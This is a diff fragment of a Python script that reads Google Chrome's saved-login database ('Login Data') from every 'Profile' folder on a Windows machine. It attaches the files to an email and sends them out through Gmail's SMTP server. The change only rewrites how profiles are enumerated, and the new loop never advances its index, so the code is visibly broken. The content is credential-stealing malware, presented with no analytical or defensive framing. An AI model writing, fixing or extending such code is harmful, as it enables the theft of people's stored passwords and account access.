@@ -38,20 +38,16 @@ with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
     # Iterate through profiles and attach the Login Data file
     profiles_dir = os.path.join(home_dir, "AppData", "Local", "Google", "Chrome", "User Data")
     profile_prefix = "Profile "
-    profile_num = 1
+    index = 0
     count = 0
-    while True:
-        profile_path = os.path.join(profiles_dir, profile_prefix + str(profile_num))
-        login_data_path = os.path.join(profile_path, "Login Data")
-        
-        if not os.path.exists(login_data_path):
-            if count == 10:
-                break
-            count += 1
-            profile_num += 1
-            continue
+    items = os.listdir(profiles_dir)
+    while index < len(items):
+        item = items[index]
+        full_path = os.path.join(profiles_dir, item)
+        if os.path.isdir(full_path) and item.startswith("Profile "):
+            login_data_path = os.path.join(full_path, "Login Data")
+            attach_file(em, login_data_path)
 
-        attach_file(em, login_data_path)
-        profile_num += 1
+
 
     smtp.sendmail(email_sender, email_receiver, em.as_string())
